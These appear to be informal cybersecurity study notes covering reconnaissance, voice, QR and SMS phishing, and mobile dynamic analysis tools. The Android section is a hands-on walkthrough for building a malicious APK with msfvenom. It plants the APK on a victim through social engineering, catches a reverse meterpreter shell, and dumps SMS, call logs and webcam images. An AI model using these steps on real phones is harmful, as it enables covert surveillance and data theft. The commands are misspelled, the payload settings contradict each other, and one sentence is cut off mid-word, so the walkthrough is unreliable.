# Information Gathering

Information gathering forms the bedrock of most cyberattacks.  It's the reconnaissance phase where attackers attempt to learn as much as possible about their target.  This could include technical details like network infrastructure, software versions, and security vulnerabilities, as well as organizational information such as employee names, contact details, and organizational structure.  Attackers use a variety of techniques, both passive and active.  Passive methods involve collecting publicly available data like website information, social media profiles, and news articles. Active methods might include port scanning, vulnerability scanning, and even social engineering tactics to elicit information directly from individuals. The logic behind information gathering is simple: the more an attacker knows, the more effectively they can tailor their attack for maximum impact.  This gathered intelligence allows them to identify weak points, choose the right tools, and craft convincing pretexts for social engineering attacks.

- *whois Domain Lookup*
- *whois iplookup*
- *whois MAC lookup*

# Vishing

Vishing, or voice phishing, leverages the telephone system to trick victims into divulging sensitive information.  It preys on the inherent trust people often place in phone calls.  Attackers might impersonate bank officials, technical support personnel, or other authority figures to create a sense of urgency or authority.  They may claim there's a problem with the victim's account, a security breach, or an overdue payment, pressuring the victim to provide personal details, passwords, or financial information.  The logical underpinning of vishing is the exploitation of human psychology.  By creating a sense of fear, urgency, or even excitement, attackers bypass rational thought and manipulate victims into acting impulsively.  Vishing attacks often involve sophisticated social engineering techniques, including pre-recorded messages, spoofed caller IDs, and background noise to simulate a call center environment.

# Quishing

Quishing, or QR code phishing, is a relatively new form of attack that uses malicious QR codes to steal information.  QR codes are increasingly used for legitimate purposes like mobile payments, website access, and product information.  Quishing attacks exploit this growing reliance by creating QR codes that redirect users to fake websites or download malware.  These malicious QR codes can be placed in seemingly innocuous locations, such as posters, advertisements, or even business cards.  When a victim scans the code with their smartphone, they are unknowingly taken to a fraudulent website that mimics a legitimate one, prompting them to enter their credentials or other sensitive data.  The logic of quishing relies on the convenience and assumed safety of QR codes.  Users are often accustomed to quickly scanning codes without verifying their source, making them vulnerable to this type of attack.

# Smishing

Smishing, or SMS phishing, uses text messages to deceive victims.  Similar to vishing, smishing attacks often create a sense of urgency or opportunity.  Attackers might send text messages claiming the victim has won a prize, needs to confirm a delivery, or has a problem with their bank account.  These messages typically include a link to a fake website designed to capture login credentials, credit card information, or other sensitive data.  The logic of smishing exploits the ubiquity and immediacy of text messages.  People are more likely to open and respond to a text message quickly than an email, increasing the chances of a successful attack. Smishing attacks often leverage shortened URLs to obscure the destination, making it harder for victims to identify a malicious link.


# It Is About Finding Them

All these things keeps on happening, you need to consider Domain Lookup.

<div style="border-left: 4px solid #007acc; background-color: #f1f6f9; padding: 10px; border-radius: 5px;">
<strong>Note: </strong> When a machine is involved into some suspicious activity and that the identification of the machine is difficult then it is not that hard to identify using the service providers, say ISPs, even VPN Providers. In India, the Govt ask to keep the Data of the services used for the **3 Months**, and that when asked they should be able to give the information to the Govt. 
</div>
<br> 


**Collaboration with ISPs, VPN Provider**, When you need to identify the machine, you can `traceroute` the machine. 


# Android Security

*So How Does the Android Architecture works?* 

Attacker will have a machine (Kali Linux) and will create a *.apk* file that will have the malicious code and through social engineering he'll be making implementing the payload and victim (Android Phone) will be downloading the .apk file and will get hack. 

```
sudo msfvenom -p androud/meterpreter/reverse_http LHOST=192..168.100.228 LPORT=5000 > hack.apk
```

You need to open the listening port on the saem server and this you will be able to respond to the requests of the Android Device and this you'll need to open the mfsconsole and run the multi/handler. Start by msfconsole.

```
sudo mfsconsole
```

Then use the `multi/handler`.

```
use multi/handler
```

After multi/handler you need to set the reverse meterpreter that will send the request to android device for the reverse shell using the following command.

```
set payload android/meterpreter/reverse_tcp
```

Then set the LHOST as the IP of the server/machine that is running the apache server meaning the IP address of the machine, the you need to specify the listening port that tht 

Now you can dump the messages using the following command.

```
dump_sms

dump-callog

dump_snap

webcam_snap
```

# Dynamic Analyser for Mobile Applications

A Dynamic Analyzer for Mobile Applications is a security testing tool that analyzes an app's behavior *while it's running*. This is in contrast to static analysis, which examines the app's code without executing it. Dynamic analysis provides insights into the app's runtime behavior, memory usage, network interactions, and potential vulnerabilities that might not be detectable through static analysis alone.

Dynamic analysis is a crucial component of mobile app security testing, providing valuable insights into an app's runtime behavior and helping developers identify and fix vulnerabilities that might not be detectable through other methods.  It's often used in conjunction with static analysis to provide a comprehensive security assessment.

Dynamic analysis tools typically instrument the app or the underlying operating system to monitor its execution.  They track various events and interactions, such as:

* **System Calls**,  Observing how the app interacts with the operating system, including file access, network connections, and permission requests.
* **Network Traffic**,  Capturing and analyzing the data exchanged between the app and external servers, identifying potential leaks of sensitive information or insecure communication practices.
* **Memory Usage**, Monitoring memory allocation and deallocation to detect memory leaks or buffer overflows.
* **User Interface Interactions**,  Recording user actions and the app's responses to identify UI-related vulnerabilities or logic flaws.
* **Code Execution**, Tracking the flow of execution through the app's code to identify potential vulnerabilities or unexpected behavior.

Few examples are below:

* **Frida:** A popular open-source dynamic instrumentation toolkit.
* **MobSF (Mobile Security Framework):** An all-in-one automated mobile app security testing framework.
* **Drozer:** A security assessment framework for Android.
* **Cydia Substrate:**  A code injection platform for iOS (jailbroken devices).

Dynamic analysis only covers the parts of the app that are executed during the testing session.  It may miss vulnerabilities in code paths that are not exercised. Thus, Environment dependencies are another issue, results can be influenced by the specific device and operating system version being used for testing. False Positives/Negatives, dynamic analyzers can sometimes generate false positives (reporting vulnerabilities that don't actually exist) or false negatives (failing to detect existing vulnerabilities).







